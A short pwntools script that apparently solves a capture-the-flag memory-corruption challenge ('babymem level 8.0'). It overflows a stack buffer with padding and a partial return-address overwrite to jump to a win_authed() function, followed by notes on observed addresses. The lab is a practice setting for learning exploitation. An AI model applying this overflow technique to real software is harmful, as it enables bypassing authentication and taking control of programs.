from pwn import *
context.terminal = "bash"
p = process("/challenge/babymem_level8.0")
for j in range(40):
    print(p.recvline())
print(p.recvuntil(b"size:"))
p.sendline(b'138')
print(p.recvuntil(b"bytes)!"))
win = b"A"*54
win += pack(0x00)
win += b"A"*78
win += pack(0x2462)
print(win)
#win += pack(0x0000000000)
#print(win)
sys.stdout.flush()
p.sendline(win)
for j in range(60):
    print(p.recvline())
for j in range(60):
    print(p.recvline())

'''
- the saved return address is now pointing to 0x560d9f0ec608.
- the address of win_authed() is 0x560d9f0ebd14

0x7ffeae2e96c0
0x7ffeae2e9738

- the saved return address is now pointing to 0x55fb0a64d608.
- the address of win_authed() is 0x55fb0a64cd14.


0x0000562b0ec7ae3c
0x0000562b0ec72462

- the saved return address is now pointing to 0x5635c48c8608.
- the address of win_authed() is 0x5635c48c7d14.

'''